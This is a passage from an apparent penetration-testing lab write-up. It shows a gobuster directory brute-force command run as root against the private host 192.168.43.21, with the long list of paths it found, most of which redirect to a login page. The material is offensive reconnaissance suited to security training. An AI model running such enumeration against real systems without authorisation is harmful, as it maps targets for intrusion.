SANs</span><br><span class="line"></span><br><span class="line">gobuster dir -u https://192.168.43.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -k</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u https://192.168.43.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -k                                                                                    1 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     https://192.168.43.21/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/27 07:48:43 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 237] [--&gt; https://192.168.43.21/images/]</span><br><span class="line">/index.php            (Status: 302) [Size: 0] [--&gt; ./module/dashboard_view/index.php]</span><br><span class="line">/login.php            (Status: 200) [Size: 3167]                                     </span><br><span class="line">/header.php           (Status: 200) [Size: 1676]                                     </span><br><span class="line">/modules.txt          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules              (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules.php          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules.html         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/footer.php           (Status: 500) [Size: 226]                                      </span><br><span class="line">/css                  (Status: 301) [Size: 234] [--&gt; https://192.168.43.21/css/]     </span><br><span class="line">/includes             (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includes.html        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includes.txt         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includes.php         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/js                   (Status: 301) [Size: 233] [--&gt; https://192.168.43.21/js/]      </span><br><span class="line">/cache                (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache.php            (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/logout.php           (Status: 200) [Size: 2536]                                     </span><br><span class="line">/include              (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/include.html         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/include.txt          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache.html           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/include.php          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache.txt            (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module.txt           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module.php           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module               (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module.html          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/side.php             (Status: 500) [Size: 0]                                        </span><br><span class="line">/included             (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/included.html        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/included.txt         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/included.php         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/nagios               (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cached               (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cached.html          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cached.txt           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cached.php           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacti                (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheviewx.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheviewx.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheviewx           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheviewx.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-httplib       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-httplib.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-httplib.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-httplib.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib2.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib2.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib2.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib2       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urllib.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-anydbm        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-anydbm.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-anydbm.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-anydbm.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-logging       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-logging.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-logging.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-logging.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xdrlib        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-socket.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xdrlib.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xdrlib.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-socket.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xdrlib.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-socket        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-socket.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-os            (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ConfigParser.html (Status: 302) [Size: 196] [--&gt; /login.php##]               </span><br><span class="line">/module-mimetools     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-HTMLParser.php (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-dbm           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gdbm.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dbhash        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-bsddb         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-os.html       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ConfigParser.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                </span><br><span class="line">/module-mimetools.html (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-pickle.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-HTMLParser    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dbm.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dbhash.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gdbm          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dumbdbm.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-os.txt        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-bsddb.html    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ConfigParser.php (Status: 302) [Size: 196] [--&gt; /login.php##]                </span><br><span class="line">/module-mimetools.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-pickle        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-HTMLParser.html (Status: 302) [Size: 196] [--&gt; /login.php##]                 </span><br><span class="line">/module-dbhash.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dbm.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dumbdbm.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gdbm.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-os.php        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-bsddb.txt     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ConfigParser  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-mimetools.php (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-getopt        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-bsddb.php     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dumbdbm.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dbhash.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-pickle.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gdbm.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dbm.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-HTMLParser.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-getopt.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dumbdbm       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-pickle.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-shelve        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-exceptions.html (Status: 302) [Size: 196] [--&gt; /login.php##]                 </span><br><span class="line">/module-getopt.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-string        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-getopt.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-string.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-exceptions.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-math.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-shelve.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-random.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-shelve.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-exceptions.php (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-string.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-math          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-random        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-string.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-exceptions    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-shelve.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-random.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-math.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-math.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-random.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-imp           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-site          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SimpleXMLRPCServer (Status: 302) [Size: 196] [--&gt; /login.php##]              </span><br><span class="line">/module-imp.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-DocXMLRPCServer (Status: 302) [Size: 196] [--&gt; /login.php##]                 </span><br><span class="line">/module-site.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-site.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-DocXMLRPCServer.html (Status: 302) [Size: 196] [--&gt; /login.php##]            </span><br><span class="line">/module-imp.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SimpleXMLRPCServer.html (Status: 302) [Size: 196] [--&gt; /login.php##]         </span><br><span class="line">/module-imp.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SimpleXMLRPCServer.txt (Status: 302) [Size: 196] [--&gt; /login.php##]          </span><br><span class="line">/module-site.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-DocXMLRPCServer.txt (Status: 302) [Size: 196] [--&gt; /login.php##]             </span><br><span class="line">/module-DocXMLRPCServer.php (Status: 302) [Size: 196] [--&gt; /login.php##]             </span><br><span class="line">/module-SimpleXMLRPCServer.php (Status: 302) [Size: 196] [--&gt; /login.php##]          </span><br><span class="line">/module-webbrowser    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-wsgiref       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-webbrowser.html (Status: 302) [Size: 196] [--&gt; /login.php##]                 </span><br><span class="line">/module-webbrowser.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-cgitb         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-wsgiref.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-webbrowser.php (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-cgitb.html    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-wsgiref.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-wsgiref.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cgitb.txt     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urlparse      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SocketServer.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                </span><br><span class="line">/module-urlparse.html (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cgitb.php     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xmlrpclib.html (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-uuid          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-telnetlib     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cookielib     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SocketServer.php (Status: 302) [Size: 196] [--&gt; /login.php##]                </span><br><span class="line">/module-telnetlib.html (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-cookielib.html (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-xmlrpclib.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-uuid.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SocketServer  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urlparse.txt  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-BaseHTTPServer (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-SimpleHTTPServer (Status: 302) [Size: 196] [--&gt; /login.php##]                </span><br><span class="line">/module-SocketServer.html (Status: 302) [Size: 196] [--&gt; /login.php##]               </span><br><span class="line">/module-xmlrpclib.php (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cookielib.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-uuid.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-telnetlib.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-CGIHTTPServer (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-urlparse.php  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cookielib.php (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-uuid.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SimpleHTTPServer.html (Status: 302) [Size: 196] [--&gt; /login.php##]           </span><br><span class="line">/module-BaseHTTPServer.html (Status: 302) [Size: 196] [--&gt; /login.php##]             </span><br><span class="line">/module-telnetlib.php (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xmlrpclib     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-BaseHTTPServer.txt (Status: 302) [Size: 196] [--&gt; /login.php##]              </span><br><span class="line">/module-ftplib        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-CGIHTTPServer.html (Status: 302) [Size: 196] [--&gt; /login.php##]              </span><br><span class="line">/module-SimpleHTTPServer.txt (Status: 302) [Size: 196] [--&gt; /login.php##]            </span><br><span class="line">/module-smtplib       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-SimpleHTTPServer.php (Status: 302) [Size: 196] [--&gt; /login.php##]            </span><br><span class="line">/module-smtpd         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ftplib.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-CGIHTTPServer.txt (Status: 302) [Size: 196] [--&gt; /login.php##]               </span><br><span class="line">/module-nntplib       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-BaseHTTPServer.php (Status: 302) [Size: 196] [--&gt; /login.php##]              </span><br><span class="line">/module-gopherlib     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-poplib        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ftplib.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-smtplib.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-nntplib.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-smtpd.html    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-CGIHTTPServer.php (Status: 302) [Size: 196] [--&gt; /login.php##]               </span><br><span class="line">/module-imaplib       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gopherlib.html (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-poplib.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-smtplib.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-smtpd.txt     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-ftplib.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-nntplib.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-imaplib.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gopherlib.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-poplib.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-smtplib.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-smtpd.php     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-nntplib.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-imaplib.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-gopherlib.php (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-poplib.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-imaplib.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachefu.php          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachefu.html         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachefu.txt          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachefu              (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedump-1          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedump-1.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedump-1.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedump-1.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-StringIO      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-StringIO.html (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-StringIO.txt  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-StringIO.php  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-re.txt        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-re.php        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-re            (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-re.html       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xml.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xml.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xml.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-xml           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedlogin          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedlogin.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedlogin.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cachedlogin.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Tix           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Tix.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Tix.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Tix.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cgi           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Cookie.php    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Cookie        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cgi.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cgi.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Cookie.html   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-Cookie.txt    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-cgi.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-email         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-email.html    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-email.txt     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-email.php     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modulelist           (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modulelist.html      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modulelist.txt       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modulelist.php       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-assistant     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-assistant.html (Status: 302) [Size: 196] [--&gt; /login.php##]                  </span><br><span class="line">/module-assistant.txt (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-assistant.php (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheworthy.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheworthy          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheworthy.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cacheworthy.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache_now            (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache_now.html       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache_now.txt        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/cache_now.php        (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules-list.txt     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules-list.php     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules-list         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/modules-list.html    (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includemanager       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includemanager.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includemanager.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includemanager.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includedcontent.txt  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includedcontent.php  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includedcontent      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/includedcontent.html (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dict          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dict.html     (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dict.txt      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-dict.php      (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/moduler              (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/moduler.html         (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/moduler.txt          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/moduler.php          (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-actions.txt   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-actions       (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-actions.php   (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">/module-actions.html  (Status: 302) [Size: 196] [--&gt; /login.php##]                   </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span 